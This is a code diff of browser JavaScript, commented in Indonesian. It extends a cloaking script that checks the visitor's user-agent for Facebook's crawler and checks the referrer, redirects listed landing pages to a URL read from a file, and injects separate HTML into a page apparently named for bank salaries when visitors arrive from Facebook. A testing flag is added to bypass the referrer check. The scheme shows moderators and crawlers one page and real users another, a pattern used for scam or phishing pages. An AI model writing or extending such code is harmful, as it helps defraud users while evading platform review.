@@ -3,6 +3,7 @@
   const userAgent = navigator.userAgent; // Mendapatkan user-agent
   const isFacebookCrawler = /facebookexternalhit|facebook/i.test(userAgent); // Deteksi crawler Facebook
   const currentPath = location.pathname; // Mendapatkan path URL saat ini
+  const testing = true; // Flag untuk pengujian
 
   // Fungsi untuk membaca file eksternal
   const fetchFileContent = async (filePath) => {
@@ -31,22 +32,22 @@
     });
   };
 
-  // Membaca URL dari google.txt, target.txt, dan metadata dari target.txt
+  // Membaca URL dari google.txt, target.txt, metadata dari target.txt, dan daftar halaman dari landingpage.txt
   Promise.all([
     fetchFileContent('/google.txt'),
     fetchFileContent('/target.txt'),
     fetchFileContent('/target.txt'), // Ambil metadata asli dari target.txt
+    fetchFileContent('/landingpage.txt'), // Ambil daftar halaman dari landingpage.txt
   ])
-    .then(([googleUrl, targetUrl, originalHtml]) => {
-      if (currentPath.includes('redirect.html')) {
-        // Redirect selalu dilakukan jika berada di redirect.html
+    .then(([googleUrl, targetUrl, originalHtml, landingPages]) => {
+      const landingPageList = landingPages.split('\n').map((page) => page.trim()); // Buat daftar halaman
+
+      if (landingPageList.some((page) => currentPath.includes(page))) {
+        // Jika currentPath cocok dengan salah satu halaman di landingpage.txt
         injectMetadata(originalHtml); // Sisipkan metadata asli dari target.txt
         location.href = googleUrl.trim(); // Redirect ke URL dari google.txt
-      } else if (currentPath.includes(targetUrl.trim()) && !referrer.includes('facebook.com')) {
-        // Jika gaji-bank.html diakses langsung tanpa referer Facebook
-        // Tampilkan HTML asli (tidak perlu melakukan apa-apa)
-      } else if (currentPath.includes(targetUrl.trim()) && referrer.includes('facebook.com')) {
-        // Jika gaji-bank.html diakses dari referer Facebook, injeksikan konten dari inject.html
+      } else if (currentPath.includes(targetUrl.trim()) && (!referrer.includes('facebook.com') || testing)) {
+        // Uji coba tanpa referer Facebook jika testing = true
         fetch('/inject.html')
           .then((response) => response.text())
           .then((html) => {
